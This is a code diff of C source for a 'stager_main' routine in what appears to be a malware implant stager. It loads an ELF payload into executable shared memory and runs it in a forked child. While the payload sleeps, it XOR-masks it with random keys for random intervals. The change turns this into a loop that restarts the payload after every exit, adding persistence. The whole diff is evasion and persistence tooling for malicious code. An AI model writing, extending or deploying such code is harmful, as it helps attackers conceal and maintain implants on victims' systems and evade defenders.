@@ -116,46 +116,39 @@ void stager_main(long *sp) {
       void *shared_mem = (void *)mmap(NULL, map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
       if (shared_mem == MAP_FAILED) exit(1);
 
-      long pid = fork();
-      if (pid == 0) {
-          // Child
-          // elf_run will handle loading and relocation into shared_mem
-          elf_run(final_payload, argv, envp, 1, module_path, (size_t)shared_mem);
-          exit(0);
-      } else if (pid > 0) {
-          free(final_payload); // Clean up agent buffer
-          uint8_t rotator_key[16] = {0};
-          int status = 0;
-          while (1) {
-              long res = waitpid((int)pid, &status, WUNTRACED);
-              if (res == pid) {
-                  if (WIFEXITED(status) || WIFSIGNALED(status)) break;
-                  if (WIFSTOPPED(status)) {
-                      int sig = WSTOPSIG(status);
-                      if (sig == SIGSTOP) {
-                          // Sleep Mask (Mask)
-                          getrandom(rotator_key, 16, 0);
-                          xor_payload((char *)shared_mem, map_len, rotator_key, 16);
-                          
-                          // Sleep
-                          unsigned int sleep_s = 0;
-                          getrandom(&sleep_s, sizeof(sleep_s), 0);
-                          sleep_s = 180 + (sleep_s % 300);
-                          struct timespec req = {sleep_s, 0};
-                          nanosleep(&req, NULL);
-                          
-                          // Sleep Mask (Unmask)
-                          xor_payload((char *)shared_mem, map_len, rotator_key, 16);
-                          kill((int)pid, SIGCONT);
-                      } else {
-                          kill((int)pid, SIGCONT);
-                      }
-                  }
-              }
-              if (g_trap_requested) {
-                  kill((int)pid, SIGKILL);
-                  break;
-              }
+      // PIE: Restart loop
+      uint8_t rotator_key[16] = {0};
+      while (1) {
+          long pid = fork();
+          if (pid == 0) {
+              // Child
+              // elf_run will handle loading and relocation into shared_mem
+              elf_run(final_payload, argv, envp, 1, module_path, (size_t)shared_mem);
+              exit(0);
+          } else if (pid > 0) {
+              // Parent: wait for child to exit
+              int status = 0;
+              long res = waitpid((int)pid, &status, 0);
+              if (res != pid) break;
+              if (g_trap_requested) break;
+              
+              // Child exited, rotate payload
+              getrandom(rotator_key, 16, 0);
+              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+              
+              // Sleep with configurable range
+              unsigned int sleep_s = 0;
+              getrandom(&sleep_s, sizeof(sleep_s), 0);
+              unsigned int sleep_range = SLEEP_MAX - SLEEP_MIN;
+              sleep_s = SLEEP_MIN + (sleep_s % sleep_range);
+              struct timespec req = {sleep_s, 0};
+              nanosleep(&req, NULL);
+              
+              // Unrotate payload and restart
+              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+              // Loop continues to fork again
+          } else {
+              break;
           }
       }
   } else {
@@ -167,42 +160,37 @@ void stager_main(long *sp) {
       void *shared_mem = (void *)mmap((void *)min_vaddr, map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
       if (shared_mem == MAP_FAILED) exit(1);
 
-      long pid = fork();
-      if (pid == 0) {
-          elf_run(final_payload, argv, envp, 1, module_path, 0);
-          exit(0);
-      } else if (pid > 0) {
-          free(final_payload);
-          uint8_t rotator_key[16] = {0};
-          int status = 0;
-          while (1) {
-              long res = waitpid((int)pid, &status, WUNTRACED);
-              if (res == pid) {
-                  if (WIFEXITED(status) || WIFSIGNALED(status)) break;
-                  if (WIFSTOPPED(status)) {
-                      int sig = WSTOPSIG(status);
-                      if (sig == SIGSTOP) {
-                           getrandom(rotator_key, 16, 0);
-                           xor_payload((char *)shared_mem, map_len, rotator_key, 16);
-                           
-                           unsigned int sleep_s = 0;
-                           getrandom(&sleep_s, sizeof(sleep_s), 0);
-                           sleep_s = 180 + (sleep_s % 300);
-                           struct timespec req = {sleep_s, 0};
-                           nanosleep(&req, NULL);
-                           
-                           xor_payload((char *)shared_mem, map_len, rotator_key, 16);
-                           kill((int)pid, SIGCONT);
-                      } else {
-                          kill((int)pid, SIGCONT);
-                      }
-                  }
-              }
-              if (g_trap_requested) {
-                  kill((int)pid, SIGKILL);
-                  waitpid((int)pid, &status, 0);
-                  break;
-              }
+      // Static: Restart loop
+      uint8_t rotator_key[16] = {0};
+      while (1) {
+          long pid = fork();
+          if (pid == 0) {
+              elf_run(final_payload, argv, envp, 1, module_path, 0);
+              exit(0);
+          } else if (pid > 0) {
+              // Parent: wait for child to exit
+              int status = 0;
+              long res = waitpid((int)pid, &status, 0);
+              if (res != pid) break;
+              if (g_trap_requested) break;
+              
+              // Child exited, rotate payload
+              getrandom(rotator_key, 16, 0);
+              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+              
+              // Sleep with configurable range
+              unsigned int sleep_s = 0;
+              getrandom(&sleep_s, sizeof(sleep_s), 0);
+              unsigned int sleep_range = SLEEP_MAX - SLEEP_MIN;
+              sleep_s = SLEEP_MIN + (sleep_s % sleep_range);
+              struct timespec req = {sleep_s, 0};
+              nanosleep(&req, NULL);
+              
+              // Unrotate payload and restart
+              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+              // Loop continues to fork again
+          } else {
+              break;
           }
       }
   }
